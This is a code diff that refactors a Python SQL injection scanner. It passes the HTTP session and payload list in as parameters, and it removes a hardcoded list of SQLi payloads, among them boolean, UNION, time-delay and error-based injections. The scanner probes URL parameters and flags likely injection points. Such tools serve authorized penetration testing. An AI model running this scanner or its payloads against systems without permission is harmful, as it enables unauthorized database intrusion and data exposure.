@@ -1,4 +1,3 @@
-# Improved SQL Injection Scanner
 import requests
 import urllib.parse
 import time
@@ -7,21 +6,18 @@ from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 from difflib import SequenceMatcher
 
 class SQLiScanner:
-    def __init__(self):
-        self.session = requests.Session()
-        self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        })
+    def __init__(self, session):
+        self.session = session
         
     def get_baseline_response(self, url):
         """Get baseline response for comparison"""
         try:
             response = self.session.get(url, timeout=10)
             return {
-                'status_code': response.status_code,
-                'text': response.text,
-                'length': len(response.text),
-                'headers': dict(response.headers)
+                "status_code": response.status_code,
+                "text": response.text,
+                "length": len(response.text),
+                "headers": dict(response.headers)
             }
         except Exception as e:
             print(f"Error getting baseline: {e}")
@@ -67,12 +63,12 @@ class SQLiScanner:
             return True
         
         # 2. Check for significant status code changes
-        if baseline['status_code'] == 200 and response.status_code == 500:
+        if baseline["status_code"] == 200 and response.status_code == 500:
             print(f"[+] Status code change (200->500): {test_url}")
             return True
         
         # 3. Check for significant content length changes
-        length_diff = abs(len(response.text) - baseline['length'])
+        length_diff = abs(len(response.text) - baseline["length"])
         if length_diff > 1000:  # Significant change
             print(f"[+] Significant content length change: {test_url}")
             return True
@@ -119,7 +115,7 @@ class SQLiScanner:
         """Detect boolean-based SQLi by comparing response similarity"""
         
         # Calculate similarity ratio
-        similarity = SequenceMatcher(None, baseline['text'], response.text).ratio()
+        similarity = SequenceMatcher(None, baseline["text"], response.text).ratio()
         
         # If responses are too similar, it's likely not vulnerable
         if similarity > 0.95:
@@ -159,7 +155,7 @@ class SQLiScanner:
             return list(parse_qs(parsed_url.query).keys())
         return []
 
-    def scan_sqli_improved(self, url):
+    def scan_sqli_improved(self, url, sqli_payloads):
         """Improved SQL Injection scanning"""
         print(f"Scanning SQLi for {url}")
         
@@ -180,20 +176,6 @@ class SQLiScanner:
             return False
         
         print(f"Found parameters: {actual_params}")
-        
-        # Focused payload list
-        sqli_payloads = [
-            "'",
-            "\"",
-            "' OR 1=1--",
-            "' OR 1=2--", 
-            "' AND 1=1--",
-            "' AND 1=2--",
-            "' UNION SELECT NULL--",
-            "' OR SLEEP(5)--",
-            "'; WAITFOR DELAY '0:0:5'--",
-            "' OR EXTRACTVALUE(1, CONCAT(0x7e, version(), 0x7e))--"
-        ]
         
         found_sqli = False
         vulnerability_count = 0
@@ -219,7 +201,9 @@ class SQLiScanner:
         return found_sqli
 
 # Usage function
-def scan_sqli(url):
+def scan_sqli(url, session, sqli_payloads):
     """Main function to maintain compatibility"""
-    scanner = SQLiScanner()
-    return scanner.scan_sqli_improved(url)
+    scanner = SQLiScanner(session)
+    return scanner.scan_sqli_improved(url, sqli_payloads)
+
+
